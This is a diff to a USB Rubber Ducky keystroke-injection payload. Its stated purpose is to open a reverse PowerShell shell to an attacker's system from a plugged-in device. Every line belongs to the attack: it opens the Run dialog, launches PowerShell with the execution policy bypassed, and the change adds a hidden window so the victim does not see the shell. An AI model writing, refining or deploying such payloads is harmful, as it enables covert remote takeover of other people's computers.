@@ -1,8 +1,8 @@
 REM AUTHOR Crashwire
 REM DESCRIPTION Initiates a reverse shell to the attackers system (Activate Netcat Listner and Change the IP/PORT in the payload *Requires Reverse-Powershell.ps1 file to be stored on Rubber Ducky
 ATTACKMODE HID STORAGE
-DELAY 500
+DELAY 900
 GUI r
 DELAY 500
-STRING powershell -ExecutionPolicy Bypass -File D:\reverse-powershell.ps1
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File D:\reverse-powershell.ps1
 ENTER
